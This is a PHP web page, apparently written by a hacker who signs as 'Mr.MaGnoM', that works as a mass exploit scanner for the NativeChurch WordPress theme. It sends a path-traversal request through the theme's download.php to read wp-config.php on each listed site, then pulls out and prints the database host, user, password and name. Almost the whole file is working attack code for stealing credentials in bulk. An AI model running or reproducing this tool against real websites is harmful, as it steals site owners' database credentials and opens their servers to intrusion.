<body onLoad="type_text()" ; bgColor=#FFFFFFF">
<center>
 NativeChurch theme exploit scanner  <br> Mr.MaGnoM
   <form method='post'>
     <textarea name='sites' cols='50' rows='12'></textarea> <br>
     <input type='submit' name='go' value='scan' />   <br>
   </form>
</center>
<?php

// coded by mr magnom
// facebook : https://www.facebook.com/theprincemagnom
// my blog : http://magsec.blogspot.com/

      error_reporting(0);
      set_time_limit(0);

if($_POST['go']){

 $ex=explode("\r\n",$_POST['sites']);

 foreach($ex as $urls) {
   echo scanner($urls);
 }

}

   function scanner($site){
     echo '<center>';


     $linexploit='/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php';


       $hhh=($site).($linexploit);

       $get=@file_get_contents($hhh);

       if(preg_match("#require_once\(ABSPATH . 'wp-settings.php'\);#i",$get)){

    echo '<center>'.$site.'  --->  <font color="green">infected</font>'."<br>";
     echo '<font color="blue">';

     preg_match ("#define\('DB_HOST', '(.*?)'\);#i", $get, $f);
     echo "\t\t[!] DB_HOST : ". $f[1]. "<br>";

	preg_match ("#define\('DB_USER', '(.*?)'\);#i", $get, $f) ;
	echo "\t\t[!] DB_USER : ". $f[1]. "<br>";

	preg_match ("#define\('DB_PASSWORD', '(.*?)'\);#i", $get, $f)  ;
	echo "\t\t[!] DB_PASSWORD : ". $f[1]. "<br>";

	preg_match ("#define\('DB_NAME', '(.*?)'\);#i", $get, $f) ;
	echo "\t\t[!] DB_NAME : ". $f[1]. "<br>";

    echo '</font>';

  }else{
    echo '<center>'.$site.' ---> <font color="red">not infected</font>'."<br>";
  }
  echo '</center>';
     }


?>
